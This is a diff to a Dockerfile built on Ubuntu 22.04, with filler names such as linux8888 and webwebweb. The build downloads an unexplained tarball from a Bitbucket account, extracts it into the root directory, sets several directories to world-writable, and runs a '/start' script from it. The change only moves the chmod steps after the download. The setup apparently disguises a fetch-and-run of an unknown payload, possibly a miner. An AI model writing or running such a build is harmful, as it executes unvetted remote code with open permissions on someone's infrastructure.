@@ -2,6 +2,6 @@ FROM vm/ubuntu:22.04
 
 ENV linux8888=linuxlinuxwebwebwebweblinuxlinuxwebweb8888888888888888888888888888
 
-RUN apt-get update && apt-get install zip && apt-get install unzip && chmod 777 -R /linux1 && chmod 777 -R /linux2 && chmod 777 -R /webwebwebweb8888 && chmod 777 -R /page && chmod 777 -R page1 && cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C /
+RUN apt-get update && apt-get install zip && apt-get install unzip && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C / && chmod 777 -R /linux1 && chmod 777 -R /linux2 && chmod 777 -R /webwebwebweb8888 && chmod 777 -R /page && chmod 777 -R page1
 
 RUN bash /start
